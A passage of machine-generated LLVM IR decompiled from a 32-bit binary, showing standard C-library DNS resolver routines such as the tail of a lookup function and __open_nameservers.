  %v0_10012504 = load i32, i32* @r21, align 4
  store i32 %v0_10012504, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r29.global-to-local, align 4
  store i32 268510480, i32* @lr, align 4
  %v0_1001250c = call i32 @free()
  store i32 ptrtoint (i32* @global_var_10030c60.437 to i32), i32* @r29, align 4
  br label %dec_label_pc_10012608

dec_label_pc_10012524:                            ; preds = %dec_label_pc_10012490
  %v1_10012524 = inttoptr i32 %v0_10012490 to i32*
  %v2_10012524 = load i32, i32* %v1_10012524, align 4
  store i32 %v2_10012524, i32* @r3, align 4
  store i32 268510508, i32* @lr, align 4
  %v0_10012528 = call i32 @free()
  br label %dec_label_pc_1001252c

dec_label_pc_1001252c:                            ; preds = %dec_label_pc_1001233c, %dec_label_pc_100122a4, %dec_label_pc_100123c4, %dec_label_pc_100123bc, %dec_label_pc_100122bc, %dec_label_pc_10012284, %dec_label_pc_10012524
  %v0_1001252c = load i32, i32* @r17, align 4
  %v3_1001252c = icmp eq i32 %v0_1001252c, 0
  br i1 %v3_1001252c, label %dec_label_pc_10012534, label %dec_label_pc_10012584

dec_label_pc_10012534:                            ; preds = %dec_label_pc_1001252c
  store i32 ptrtoint (i32* @global_var_1002c210.317 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10012038, i32* %r28.global-to-local, align 4
  %v4_10012550 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-228, i32 268461856, i32 ptrtoint (i32* @global_var_1002c210.317 to i32))
  store i32 268510556, i32* @lr, align 4
  %v1_10012558 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002c210.317 to i32))
  %v3_10012560 = load i32, i32* @global_var_1002c3cc.441, align 4
  store i32 %v2_10012038, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v1_1001256c = add i32 %v3_10012560, -1
  store i32 %v1_1001256c, i32* @r29, align 4
  store i32 268510580, i32* @lr, align 4
  %v0_10012570 = call i32 @__pthread_cleanup_pop_restore()
  %v0_10012574 = load i32, i32* @r22, align 4
  %v1_10012574 = load i32, i32* @r29, align 4
  %v2_10012574 = icmp slt i32 %v0_10012574, %v1_10012574
  br i1 %v2_10012574, label %dec_label_pc_1001257c, label %dec_label_pc_10012584

dec_label_pc_1001257c:                            ; preds = %dec_label_pc_10012534
  %v1_1001257c = add i32 %v0_10012574, 1
  store i32 %v1_1001257c, i32* @r22, align 4
  br label %dec_label_pc_100125a0thread-pre-split.backedge

dec_label_pc_100125a0thread-pre-split.backedge:   ; preds = %dec_label_pc_1001257c, %dec_label_pc_10012324, %dec_label_pc_1001259c
  %v0_100125a0.pr = load i32, i32* @r18, align 4
  %tmp65 = icmp ult i32 %v0_100125a0.pr, 3
  br i1 %tmp65, label %dec_label_pc_10012094.lr.ph, label %dec_label_pc_100125b8

dec_label_pc_10012584:                            ; preds = %dec_label_pc_10012234, %dec_label_pc_10012534, %dec_label_pc_1001252c, %dec_label_pc_1001224c
  %v0_10012584 = load i32, i32* @r26, align 4
  %v1_10012584 = add i32 %v0_10012584, 1
  store i32 %v1_10012584, i32* %r0.global-to-local, align 4
  %v1_10012588 = load i32, i32* @r23, align 4
  %v2_10012588 = srem i32 %v1_10012584, %v1_10012588
  store i32 %v2_10012588, i32* @r26, align 4
  %v5_10012590 = icmp eq i32 %v2_10012588, 0
  br i1 %v5_10012590, label %dec_label_pc_10012598, label %dec_label_pc_1001259c

dec_label_pc_10012598:                            ; preds = %dec_label_pc_10012584
  %v0_10012598 = load i32, i32* @r18, align 4
  %v1_10012598 = add i32 %v0_10012598, 1
  store i32 %v1_10012598, i32* @r18, align 4
  br label %dec_label_pc_1001259c

dec_label_pc_1001259c:                            ; preds = %dec_label_pc_10012584, %dec_label_pc_10012598
  store i32 -1, i32* @r22, align 4
  br label %dec_label_pc_100125a0thread-pre-split.backedge

dec_label_pc_10012094.lr.ph:                      ; preds = %dec_label_pc_10012094.lr.ph.lr.ph, %dec_label_pc_100125a0thread-pre-split.backedge
  br label %dec_label_pc_10012094

dec_label_pc_100125ac:                            ; preds = %dec_label_pc_1001200c, %dec_label_pc_10012004, %dec_label_pc_10011ffc, %entry
  store i32 -1, i32* @r19, align 4
  store i32 -1, i32* @r26, align 4
  store i32 -1, i32* @r25, align 4
  br label %dec_label_pc_100125b8

dec_label_pc_100125b8:                            ; preds = %dec_label_pc_100125a0thread-pre-split.backedge, %dec_label_pc_100120a4, %dec_label_pc_10012180, %dec_label_pc_10012244, %dec_label_pc_10012018, %dec_label_pc_100125ac
  %v0_100125b8 = call i32 @__GI___h_errno_location()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_100125c0 = inttoptr i32 %v0_100125b8 to i32*
  store i32 -1, i32* %v2_100125c0, align 4
  %v0_100125c4 = load i32, i32* @r25, align 4
  store i32 %v0_100125c4, i32* @r20, align 4
  br label %dec_label_pc_100125c8

dec_label_pc_100125c8:                            ; preds = %dec_label_pc_10012364, %dec_label_pc_100125b8
  %v0_100125c8 = load i32, i32* @r19, align 4
  %v3_100125c8 = icmp eq i32 %v0_100125c8, -1
  br i1 %v3_100125c8, label %dec_label_pc_100125d8, label %dec_label_pc_100125d0

dec_label_pc_100125d0:                            ; preds = %dec_label_pc_100125c8
  store i32 268510680, i32* @lr, align 4
  %v1_100125d4 = call i32 @__libc_close(i32 %v0_100125c8)
  br label %dec_label_pc_100125d8

dec_label_pc_100125d8:                            ; preds = %dec_label_pc_100125c8, %dec_label_pc_100125d0
  %v0_100125d8 = load i32, i32* @r21, align 4
  store i32 %v0_100125d8, i32* @r3, align 4
  store i32 -1, i32* @r27, align 4
  store i32 268510692, i32* @lr, align 4
  %v0_100125e0 = call i32 @free()
  %v0_100125e4 = load i32, i32* @r30, align 4
  store i32 %v0_100125e4, i32* @r3, align 4
  store i32 268510700, i32* @lr, align 4
  %v0_100125e8 = call i32 @free()
  %v0_100125ec = load i32, i32* @r26, align 4
  %v3_100125ec = icmp eq i32 %v0_100125ec, -1
  br i1 %v3_100125ec, label %dec_label_pc_10012638, label %dec_label_pc_100125f4

dec_label_pc_100125f4:                            ; preds = %dec_label_pc_100125d8
  store i32 ptrtoint (i32* @global_var_10030c60.437 to i32), i32* @r29, align 4
  %v2_10012600 = ptrtoint i32* %stack_var_-228 to i32
  br label %dec_label_pc_10012608

dec_label_pc_10012608:                            ; preds = %dec_label_pc_10012504, %dec_label_pc_100125f4
  %storemerge68 = phi i32 [ %v2_10012600, %dec_label_pc_100125f4 ], [ %v2_10012038, %dec_label_pc_10012504 ]
  %v1_1001260c.pre-phi = phi i32 [ %v2_10012600, %dec_label_pc_100125f4 ], [ %v2_10012038, %dec_label_pc_10012504 ]
  store i32 %storemerge68, i32* %r28.global-to-local, align 4
  %v4_10012610 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-228, i32 ptrtoint (i32* @global_var_10030c60.437 to i32), i32 ptrtoint (i32* @global_var_10030c60.437 to i32))
  %v0_10012614 = load i32, i32* @r29, align 4
  store i32 268510748, i32* @lr, align 4
  %v1_10012618 = call i32 @pthread_mutex_lock(i32 %v0_10012614)
  %v0_10012620 = load i32, i32* @r26, align 4
  store i32 %v0_10012620, i32* @global_var_1002c3c4.438, align 4
  store i32 %v1_1001260c.pre-phi, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v0_10012630 = load i32, i32* @r20, align 4
  %v1_10012630 = trunc i32 %v0_10012630 to i16
  store i16 %v1_10012630, i16* @global_var_1002c20c.439, align 2
  store i32 268510776, i32* @lr, align 4
  %v0_10012634 = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_10012638

dec_label_pc_10012638:                            ; preds = %dec_label_pc_100125d8, %dec_label_pc_10012608
  store i32 %v0_10011fb8, i32* %r0.global-to-local, align 4
  %v0_1001263c = load i32, i32* @r27, align 4
  ret i32 %v0_1001263c

; uselistorder directives
  uselistorder i32 %v2_10012588, { 1, 0 }
  uselistorder i32 %v0_100124fc, { 1, 0 }
  uselistorder i32 %v1_100124d8, { 1, 0 }
  uselistorder i32 %stack_var_-88.118, { 1, 0, 2 }
  uselistorder i32 %v0_100123a4, { 1, 0 }
  uselistorder i32 %v1_100124c8, { 1, 0 }
  uselistorder i32 %v0_10012490, { 0, 2, 1, 3 }
  uselistorder i32 %v1_10012454, { 1, 0 }
  uselistorder i32 %v0_100123e0, { 2, 1, 0 }
  uselistorder i32 %v0_1001237c, { 1, 0 }
  uselistorder i32 %v2_10012370, { 0, 2, 1, 3 }
  uselistorder i32 %v4_10012294, { 1, 0 }
  uselistorder i32 %v1_10012194, { 1, 0 }
  uselistorder i32 %v1_10012168, { 1, 0 }
  uselistorder i32 %v1_10012134, { 1, 0 }
  uselistorder i32 %v1_100120cc, { 1, 0 }
  uselistorder i32 %v2_10012038, { 0, 1, 4, 5, 2, 3, 6, 7, 8 }
  uselistorder i32* %stack_var_-228, { 4, 5, 1, 2, 3, 0, 6 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2, 3 }
  uselistorder i16* %stack_var_-212, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-184, { 1, 0, 2 }
  uselistorder i32 %tmp36, { 1, 0, 2 }
  uselistorder i32 %tmp35, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp29, { 1, 0 }
  uselistorder i32 %tmp28, { 0, 2, 1 }
  uselistorder i32* %r29.global-to-local, { 0, 1, 2, 3, 9, 10, 4, 5, 6, 7, 8 }
  uselistorder i32* %r28.global-to-local, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 14, 4, 5, 6, 9, 7, 8, 10, 11, 12, 13, 34, 15, 0, 33, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 (i32, i32, i32)* @__libc_poll, { 0, 2, 1 }
  uselistorder i32 101, { 1, 0, 2 }
  uselistorder i32 (i32)* @inet_addr, { 5, 3, 2, 1, 0, 4 }
  uselistorder i16 10, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 2, 5, 1, 0, 4, 3 }
  uselistorder i16* @global_var_1002c20c.439, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10030c60.437 to i32), { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 1025, { 2, 3, 1, 4, 0 }
  uselistorder i32 512, { 2, 3, 0, 1, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_10012638, { 1, 0 }
  uselistorder label %dec_label_pc_10012608, { 1, 0 }
  uselistorder label %dec_label_pc_100125d8, { 1, 0 }
  uselistorder label %dec_label_pc_100125c8, { 1, 0 }
  uselistorder label %dec_label_pc_100125b8, { 5, 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_10012094.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_1001259c, { 1, 0 }
  uselistorder label %dec_label_pc_10012584, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_100125a0thread-pre-split.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001252c, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_10012504, { 1, 0 }
  uselistorder label %dec_label_pc_100124e0, { 2, 5, 4, 6, 3, 0, 1 }
  uselistorder label %dec_label_pc_100124d8, { 1, 0 }
  uselistorder label %dec_label_pc_100124c4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10012430, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1001236c, { 1, 0 }
  uselistorder label %dec_label_pc_10012364, { 1, 0 }
  uselistorder label %dec_label_pc_10012208, { 1, 0 }
  uselistorder label %dec_label_pc_10012180, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100120a4, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %v2_10012670 = ptrtoint i32* %stack_var_-200 to i32
  store i32 %v2_10012670, i32* %r3.global-to-local, align 4
  %v4_10012678 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-200, i32 268461856, i32 ptrtoint (i32* @global_var_1002c210.317 to i32))
  store i32 ptrtoint (i32* @global_var_1002c210.317 to i32), i32* %r3.global-to-local, align 4
  store i32 268510852, i32* @lr, align 4
  %v1_10012680 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002c210.317 to i32))
  store i32 %v1_10012680, i32* %r3.global-to-local, align 4
  %v3_10012688 = load i32, i32* @global_var_1002c3c8.318, align 4
  %v2_1001268c = icmp sgt i32 %v3_10012688, 0
  br i1 %v2_1001268c, label %dec_label_pc_10012904, label %dec_label_pc_10012694

dec_label_pc_10012694:                            ; preds = %entry
  store i32 ptrtoint ([17 x i8]* @global_var_10017418.452 to i32), i32* %r3.global-to-local, align 4
  store i32 268510892, i32* @lr, align 4
  %v3_100126a8 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_10017418.452 to i32), i32 ptrtoint (i32* @global_var_1001742c.451 to i32))
  store i32 %v3_100126a8, i32* %r3.global-to-local, align 4
  store i32 %v3_100126a8, i32* @r26, align 4
  %v3_100126ac = icmp eq i32 %v3_100126a8, 0
  br i1 %v3_100126ac, label %dec_label_pc_100126b4, label %dec_label_pc_100128c8.preheader

dec_label_pc_100126b4:                            ; preds = %dec_label_pc_10012694
  %v0_100126b8 = load i32, i32* @r31, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_10017430.453 to i32), i32* %r3.global-to-local, align 4
  store i32 268510916, i32* @lr, align 4
  %v3_100126c0 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_10017430.453 to i32), i32 %v0_100126b8)
  store i32 %v3_100126c0, i32* %r3.global-to-local, align 4
  store i32 %v3_100126c0, i32* @r26, align 4
  %v3_100126c4 = icmp eq i32 %v3_100126c0, 0
  br i1 %v3_100126c4, label %dec_label_pc_100128f8, label %dec_label_pc_100128c8.preheader

dec_label_pc_100128c8.preheader:                  ; preds = %dec_label_pc_10012694, %dec_label_pc_100126b4
  %v0_100128d416 = phi i32 [ %v3_100126a8, %dec_label_pc_10012694 ], [ %v3_100126c0, %dec_label_pc_100126b4 ]
  %v2_100128c8 = ptrtoint i32* %stack_var_-164 to i32
  %v1_100126d42 = bitcast i32* %stack_var_-164 to i8*
  %v3_100127b8 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_100128c8

dec_label_pc_100126d0:                            ; preds = %dec_label_pc_100126e8
  %v1_100126d0 = add i32 %v0_100127909, 1
  store i32 %v1_100126d0, i32* %r3.global-to-local, align 4
  %v1_100126d4 = inttoptr i32 %v1_100126d0 to i8*
  %v2_100126d4 = load i8, i8* %v1_100126d4, align 1
  %v3_100126d4 = zext i8 %v2_100126d4 to i32
  store i32 %v3_100126d4, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r8, align 4
  %v3_100126dc = icmp eq i8 %v2_100126d4, 0
  %v1_100126e0 = mul nuw nsw i32 %v3_100126d4, 2
  store i32 %v1_100126e0, i32* @r10, align 4
  br i1 %v3_100126dc, label %dec_label_pc_100128c8.backedge, label %dec_label_pc_100126e8

dec_label_pc_100126e8:                            ; preds = %dec_label_pc_100126e8.lr.ph, %dec_label_pc_100126d0
  %v0_10012700 = phi i32 [ %v3_100126d44, %dec_label_pc_100126e8.lr.ph ], [ %v3_100126d4, %dec_label_pc_100126d0 ]
  %v0_100127909 = phi i32 [ %v2_100128c8, %dec_label_pc_100126e8.lr.ph ], [ %v1_100126d0, %dec_label_pc_100126d0 ]
  %v0_100126ec = phi i32 [ %v1_100126e08, %dec_label_pc_100126e8.lr.ph ], [ %v1_100126e0, %dec_label_pc_100126d0 ]
  %v2_100126ec = add i32 %v0_100126ec, %v3_100126e8.pre
  %v3_100126ec = inttoptr i32 %v2_100126ec to i16*
  %v4_100126ec = load i16, i16* %v3_100126ec, align 2
  %v1_100126f0 = and i16 %v4_100126ec, 32
  %v3_100126f0 = icmp eq i16 %v1_100126f0, 0
  br i1 %v3_100126f0, label %dec_label_pc_100126f8, label %dec_label_pc_100126d0

dec_label_pc_100126f8:                            ; preds = %dec_label_pc_100126e8
  %v3_100126f8 = icmp eq i32 %v0_10012700, 10
  br i1 %v3_100126f8, label %dec_label_pc_100128c8.backedge, label %dec_label_pc_10012700

dec_label_pc_100128c8.backedge:                   ; preds = %dec_label_pc_100126d0, %dec_label_pc_1001287c, %dec_label_pc_10012884, %dec_label_pc_100128bc, %dec_label_pc_100126d4.preheader, %dec_label_pc_100126f8, %dec_label_pc_10012700, %dec_label_pc_10012824
  %v0_100128d4.pre = load i32, i32* @r26, align 4
  br label %dec_label_pc_100128c8

dec_label_pc_10012700:                            ; preds = %dec_label_pc_100126f8
  %v3_10012700 = icmp eq i32 %v0_10012700, 35
  br i1 %v3_10012700, label %dec_label_pc_100128c8.backedge, label %dec_label_pc_10012708

dec_label_pc_10012708:                            ; preds = %dec_label_pc_10012700
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r10, align 4
  store i32 0, i32* @r27, align 4
  store i32 %v2_10012670, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_1001279010 = inttoptr i32 %v0_100127909 to i8*
  %v2_1001279011 = load i8, i8* %v1_1001279010, align 1
  %v3_1001279414 = icmp eq i8 %v2_1001279011, 0
  br i1 %v3_1001279414, label %dec_label_pc_100127a4, label %dec_label_pc_1001279c

dec_label_pc_1001271c:                            ; preds = %dec_label_pc_1001279c
  %v1_1001271c = mul i32 %v0_1001271c, 4
  %v3_10012720 = load i32, i32* @global_var_1002c2d0, align 4
  store i32 %v3_10012720, i32* %r11.global-to-local, align 4
  %v1_10012724 = load i32, i32* %r6.global-to-local, align 4
  %v2_10012724 = add i32 %v1_10012724, %v1_1001271c
  %v2_10012728 = add i32 %v2_10012724, 16
  %v3_10012728 = inttoptr i32 %v2_10012728 to i32*
  store i32 %v0_10012728, i32* %v3_10012728, align 4
  %v0_10012734.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10012734

dec_label_pc_10012730:                            ; preds = %dec_label_pc_10012748
  %v1_10012730 = add i32 %v0_10012730, 1
  store i32 %v1_10012730, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10012734

dec_label_pc_10012734:                            ; preds = %dec_label_pc_1001271c, %dec_label_pc_10012730
  %v0_10012730 = phi i32 [ %v0_10012734.pre, %dec_label_pc_1001271c ], [ %v1_10012730, %dec_label_pc_10012730 ]
  %v1_10012734 = inttoptr i32 %v0_10012730 to i8*
  %v2_10012734 = load i8, i8* %v1_10012734, align 1
  %v3_10012738 = icmp eq i8 %v2_10012734, 0
  br i1 %v3_10012738, label %dec_label_pc_10012764, label %dec_label_pc_10012748

dec_label_pc_10012748:                            ; preds = %dec_label_pc_10012734
  %v3_10012740 = icmp eq i8 %v2_10012734, 10
  %v3_10012734 = zext i8 %v2_10012734 to i32
  %v1_1001273c = mul nuw nsw i32 %v3_10012734, 2
  %v1_10012748 = load i32, i32* %r11.global-to-local, align 4
  %v2_10012748 = add i32 %v1_10012748, %v1_1001273c
  %v3_10012748 = inttoptr i32 %v2_10012748 to i16*
  %v4_10012748 = load i16, i16* %v3_10012748, align 2
  %v1_1001274c = and i16 %v4_10012748, 32
  %v3_1001274c.not = icmp ne i16 %v1_1001274c, 0
  %brmerge = or i1 %v3_10012740, %v3_1001274c.not
  br i1 %brmerge, label %dec_label_pc_10012764, label %dec_label_pc_10012730

dec_label_pc_1001275c:                            ; preds = %dec_label_pc_10012778
  %v0_1001275c = load i32, i32* %r7.global-to-local, align 4
  %v1_1001275c = trunc i32 %v0_1001275c to i8
  store i8 %v1_1001275c, i8* %v1_10012764, align 1
  %v0_10012760 = load i32, i32* %r3.global-to-local, align 4
  %v1_10012760 = add i32 %v0_10012760, 1
  store i32 %v1_10012760, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10012764

dec_label_pc_10012764:                            ; preds = %dec_label_pc_10012748, %dec_label_pc_10012734, %dec_label_pc_1001275c
  %v0_10012790 = phi i32 [ %v1_10012760, %dec_label_pc_1001275c ], [ %v0_10012730, %dec_label_pc_10012734 ], [ %v0_10012730, %dec_label_pc_10012748 ]
  %v1_10012764 = inttoptr i32 %v0_10012790 to i8*
  %v2_10012764 = load i8, i8* %v1_10012764, align 1
  %v3_10012764 = zext i8 %v2_10012764 to i32
  %v3_10012768 = icmp eq i8 %v2_10012764, 0
  %v1_1001276c = mul nuw nsw i32 %v3_10012764, 2
  store i32 %v1_1001276c, i32* %r11.global-to-local, align 4
  br i1 %v3_10012768, label %dec_label_pc_1001278c, label %dec_label_pc_10012778

dec_label_pc_10012778:                            ; preds = %dec_label_pc_10012764
  %v3_10012770 = icmp eq i8 %v2_10012764, 10
  %v3_10012778 = load i32, i32* @global_var_1002c2d0, align 4
  %v2_1001277c = add i32 %v3_10012778, %v1_1001276c
  %v3_1001277c = inttoptr i32 %v2_1001277c to i16*
  %v4_1001277c = load i16, i16* %v3_1001277c, align 2
  %v1_10012780 = and i16 %v4_1001277c, 32
  %v3_10012780.not = icmp ne i16 %v1_10012780, 0
  %brmerge27 = or i1 %v3_10012770, %v3_10012780.not
  br i1 %brmerge27, label %dec_label_pc_1001275c, label %dec_label_pc_1001278c

dec_label_pc_1001278c:                            ; preds = %dec_label_pc_10012778, %dec_label_pc_10012764
  %v0_1001278c = load i32, i32* @r27, align 4
  %v1_1001278c = add i32 %v0_1001278c, 1
  store i32 %v1_1001278c, i32* @r27, align 4
  %v2_10012790 = load i8, i8* %v1_10012764, align 1
  %v3_10012794 = icmp eq i8 %v2_10012790, 0
  br i1 %v3_10012794, label %dec_label_pc_100127a4, label %dec_label_pc_1001279c

dec_label_pc_1001279c:                            ; preds = %dec_label_pc_10012708, %dec_label_pc_1001278c
  %v0_10012728 = phi i32 [ %v0_10012790, %dec_label_pc_1001278c ], [ %v0_100127909, %dec_label_pc_10012708 ]
  %v0_1001271c = phi i32 [ %v1_1001278c, %dec_label_pc_1001278c ], [ 0, %dec_label_pc_10012708 ]
  %tmp33 = icmp slt i32 %v0_1001271c, 5
  br i1 %tmp33, label %dec_label_pc_1001271c, label %dec_label_pc_100127a4

dec_label_pc_100127a4:                            ; preds = %dec_label_pc_1001278c, %dec_label_pc_1001279c, %dec_label_pc_10012708
  store i32 %tmp, i32* @r30, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_10017448.454 to i32), i32* @r4, align 4
  store i32 1, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v4_100127b8 = call i32 @__GI_strcoll(i8* %v3_100127b8, i32 ptrtoint ([11 x i8]* @global_var_10017448.454 to i32))
  store i32 %v4_100127b8, i32* %r3.global-to-local, align 4
  %v3_100127bc = icmp eq i32 %v4_100127b8, 0
  br i1 %v3_100127bc, label %dec_label_pc_100127e8, label %dec_label_pc_1001280c

dec_label_pc_100127c8:                            ; preds = %dec_label_pc_10012800
  %v1_100127c8 = add i32 %v2_100127f0, 24
  %v2_100127c8 = inttoptr i32 %v1_100127c8 to i32*
  %v3_100127c8 = load i32, i32* %v2_100127c8, align 4
  store i32 %v3_100127c8, i32* %r3.global-to-local, align 4
  store i32 268511184, i32* @lr, align 4
  %v1_100127cc = call i32 @__GI_strdup(i32 %v3_100127c8)
  store i32 %v1_100127cc, i32* %r3.global-to-local, align 4
  %v0_100127d4 = load i32, i32* @r29, align 4
  %v1_100127d4 = add i32 %v0_100127d4, 1
  store i32 %v1_100127d4, i32* %r11.global-to-local, align 4
  %v1_100127d8 = mul i32 %v0_100127d4, 4
  store i32 %v1_100127d4, i32* @global_var_1002c3c8.318, align 4
  %v3_100127e4 = add i32 %v1_100127d8, ptrtoint (i32* @global_var_10030d3c.319 to i32)
  %v4_100127e4 = inttoptr i32 %v3_100127e4 to i32*
  store i32 %v1_100127cc, i32* %v4_100127e4, align 4
  br label %dec_label_pc_100127e8

dec_label_pc_100127e8:                            ; preds = %dec_label_pc_100127a4, %dec_label_pc_100127c8
  %v0_100127e8 = load i32, i32* @r31, align 4
  %v1_100127e8 = load i32, i32* @r27, align 4
  %v2_100127e8 = icmp slt i32 %v0_100127e8, %v1_100127e8
  %v1_100127ec = mul i32 %v0_100127e8, 4
  %v0_100127f0 = load i32, i32* @r1, align 4
  %v2_100127f0 = add i32 %v0_100127f0, %v1_100127ec
  br i1 %v2_100127e8, label %dec_label_pc_10012800, label %dec_label_pc_1001280c

dec_label_pc_10012800:                            ; preds = %dec_label_pc_100127e8
  %v3_10012800 = load i32, i32* @global_var_1002c3c8.318, align 4
  %tmp35 = icmp slt i32 %v3_10012800, 3
  br i1 %tmp35, label %dec_label_pc_100127c8, label %dec_label_pc_1001280c

dec_label_pc_1001280c:                            ; preds = %dec_label_pc_10012800, %dec_label_pc_100127e8, %dec_label_pc_100127a4
  %v0_10012810 = load i32, i32* @r30, align 4
  store i32 %v0_10012810, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_10017454.455 to i32), i32* @r4, align 4
  %v3_10012818 = inttoptr i32 %v0_10012810 to i8*
  %v4_10012818 = call i32 @__GI_strcoll(i8* %v3_10012818, i32 ptrtoint ([7 x i8]* @global_var_10017454.455 to i32))
  store i32 %v4_10012818, i32* %r3.global-to-local, align 4
  %v3_1001281c = icmp eq i32 %v4_10012818, 0
  br i1 %v3_1001281c, label %dec_label_pc_1001285c.preheader, label %dec_label_pc_10012824

dec_label_pc_10012824:                            ; preds = %dec_label_pc_1001280c
  %v0_10012828 = load i32, i32* @r30, align 4
  store i32 %v0_10012828, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1001745c.456 to i32), i32* @r4, align 4
  %v3_10012830 = inttoptr i32 %v0_10012828 to i8*
  %v4_10012830 = call i32 @__GI_strcoll(i8* %v3_10012830, i32 ptrtoint ([7 x i8]* @global_var_1001745c.456 to i32))
  store i32 %v4_10012830, i32* %r3.global-to-local, align 4
  %v3_10012834 = icmp eq i32 %v4_10012830, 0
  br i1 %v3_10012834, label %dec_label_pc_1001285c.preheader, label %dec_label_pc_100128c8.backedge

dec_label_pc_1001285c.preheader:                  ; preds = %dec_label_pc_1001280c, %dec_label_pc_10012824
  store i32 ptrtoint (i32* @global_var_10030d2c.443 to i32), i32* @r31, align 4
  %v3_1001286841 = load i32, i32* @global_var_1002c3cc.441, align 4
  %v2_1001286c43 = icmp sgt i32 %v3_1001286841, 0
  %v1_1001287045 = add i32 %v3_1001286841, -1
  %v1_1001287446 = mul i32 %v1_1001287045, 4
  store i32 %v1_1001287446, i32* %r11.global-to-local, align 4
  br i1 %v2_1001286c43, label %dec_label_pc_10012840, label %dec_label_pc_1001287c

dec_label_pc_10012840:                            ; preds = %dec_label_pc_1001285c.preheader, %dec_label_pc_10012840
  %v1_1001287448 = phi i32 [ %v1_10012874, %dec_label_pc_10012840 ], [ %v1_1001287446, %dec_label_pc_1001285c.preheader ]
  %v1_1001287047 = phi i32 [ %v1_10012870, %dec_label_pc_10012840 ], [ %v1_1001287045, %dec_label_pc_1001285c.preheader ]
  %v2_10012840 = add i32 %v1_1001287448, ptrtoint (i32* @global_var_10030d2c.443 to i32)
  %v3_10012840 = inttoptr i32 %v2_10012840 to i32*
  %v4_10012840 = load i32, i32* %v3_10012840, align 4
  store i32 %v4_10012840, i32* @r3, align 4
  store i32 %v1_1001287047, i32* @global_var_1002c3cc.441, align 4
  store i32 268511308, i32* @lr, align 4
  %v0_10012848 = call i32 @free()
  store i32 %v0_10012848, i32* %r3.global-to-local, align 4
  %v3_1001284c = load i32, i32* @global_var_1002c3cc.441, align 4
  %v1_10012854 = mul i32 %v3_1001284c, 4
  %v1_10012858 = load i32, i32* @r31, align 4
  %v3_10012858 = add i32 %v1_10012858, %v1_10012854
  %v4_10012858 = inttoptr i32 %v3_10012858 to i32*
  store i32 0, i32* %v4_10012858, align 4
  store i32 ptrtoint (i32* @global_var_10030d2c.443 to i32), i32* @r31, align 4
  %v3_10012868 = load i32, i32* @global_var_1002c3cc.441, align 4
  %v2_1001286c = icmp sgt i32 %v3_10012868, 0
  %v1_10012870 = add i32 %v3_10012868, -1
  %v1_10012874 = mul i32 %v1_10012870, 4
  store i32 %v1_10012874, i32* %r11.global-to-local, align 4
  br i1 %v2_1001286c, label %dec_label_pc_10012840, label %dec_label_pc_1001287c

dec_label_pc_1001287c:                            ; preds = %dec_label_pc_10012840, %dec_label_pc_1001285c.preheader
  %v3_100128bc59 = phi i32 [ %v3_1001286841, %dec_label_pc_1001285c.preheader ], [ %v3_10012868, %dec_label_pc_10012840 ]
  %v1_100128a449 = load i32, i32* @r27, align 4
  %v2_100128a450 = icmp sgt i32 %v1_100128a449, 1
  %v0_100128ac53 = load i32, i32* @r1, align 4
  %v2_100128ac54 = add i32 %v0_100128ac53, 4
  br i1 %v2_100128a450, label %dec_label_pc_100128bc, label %dec_label_pc_100128c8.backedge

dec_label_pc_10012884:                            ; preds = %dec_label_pc_100128bc
  %v1_10012884 = add i32 %v2_100128ac55, 24
  %v2_10012884 = inttoptr i32 %v1_10012884 to i32*
  %v3_10012884 = load i32, i32* %v2_10012884, align 4
  store i32 %v3_10012884, i32* %r3.global-to-local, align 4
  store i32 268511372, i32* @lr, align 4
